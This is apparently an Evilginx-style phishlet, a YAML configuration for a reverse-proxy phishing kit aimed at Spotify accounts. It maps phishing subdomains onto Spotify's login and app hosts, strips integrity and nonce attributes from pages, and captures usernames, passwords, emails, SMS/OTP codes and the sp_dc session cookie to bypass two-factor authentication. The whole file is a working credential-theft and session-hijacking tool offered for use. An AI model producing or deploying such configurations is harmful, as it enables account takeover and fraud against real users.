min_ver: '3.0.0'
author: '0fukuAkz'

proxy_hosts:
  # Login / account portal
  - {phish_sub: 'spotify', orig_sub: 'accounts', domain: 'spotify.com', session: true, is_landing: true, auto_filter: true}
  # Main app — post-login redirect target; captures session cookie on arrival
  - {phish_sub: 'open', orig_sub: 'open', domain: 'spotify.com', session: true, is_landing: false, auto_filter: true}
  # Image CDN — album art, profile pictures on login page
  - {phish_sub: 'scdn', orig_sub: 'i', domain: 'scdn.co', session: false, is_landing: false, auto_filter: false}

sub_filters:
  - {triggers_on: 'accounts.spotify.com', orig_sub: 'accounts', domain: 'spotify.com', search: ' integrity="[^"]*"', replace: '', mimes: ['text/html']}
  - {triggers_on: 'accounts.spotify.com', orig_sub: 'accounts', domain: 'spotify.com', search: ' integrity=''[^'']*''', replace: '', mimes: ['text/html']}
  - {triggers_on: 'accounts.spotify.com', orig_sub: 'accounts', domain: 'spotify.com', search: ' nonce="[^"]*"', replace: '', mimes: ['text/html']}
  - {triggers_on: 'accounts.spotify.com', orig_sub: 'accounts', domain: 'spotify.com', search: ' nonce=''[^'']*''', replace: '', mimes: ['text/html']}
  - {triggers_on: 'accounts.spotify.com', orig_sub: 'accounts', domain: 'spotify.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'accounts.spotify.com', orig_sub: 'open', domain: 'spotify.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}

auth_tokens:
  # sp_dc is the primary Spotify session cookie — required for API access
  - domain: '.spotify.com'
    keys: ['sp_dc', 'sp_key,opt', 'sp_t,opt', '_gid,opt', 'sp_new,opt', 'optimize.sk,opt']
    type: 'cookie'

credentials:
  username:
    key: 'username'
    search: '(.*)'
    type: 'post'

  password:
    key: 'password'
    search: '(.*)'
    type: 'post'

  custom:
    # Spotify also accepts email as username
    - {key: 'email', search: '(.*)', type: 'post'}
    # 2FA / OTP (phone verification)
    - {key: 'code', search: '(.*)', type: 'post'}
    - {key: 'smsCode', search: '(.*)', type: 'post'}

auth_urls:
  - '/api/login'
  - '/login/password'
  - '/en/status'
  - '/account/overview'

login:
  domain: 'accounts.spotify.com'
  path: '/en/login'
